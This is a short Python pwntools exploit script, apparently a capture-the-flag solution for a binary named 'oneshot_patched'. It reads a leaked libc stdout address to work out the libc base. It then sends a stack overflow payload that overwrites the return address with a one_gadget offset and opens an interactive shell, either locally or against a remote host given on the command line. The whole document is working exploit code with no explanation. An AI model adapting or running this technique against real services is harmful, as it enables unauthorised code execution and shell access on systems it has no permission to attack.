
from pwn import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./oneshot_patched", )
elf = context.binary = ELF("./oneshot_patched", checksec=False)

libc = ELF('./libc.so.6')



context.log_level = 'info'



io.recvuntil(b'stdout: ')
leak_stdout = int(io.recv(14),16)

print(f'leak_stdout: {hex(leak_stdout)}')

libc.address = leak_stdout - libc.sym['_IO_2_1_stdout_']	
print(f'libc.address: {hex(libc.address)}')


payload = b'A'*24 + b'\x00'*8 + b'B'*8 + p64(libc.address + 0x45216)
io.recvuntil(b'MSG: ')

io.sendline(payload)
io.interactive()

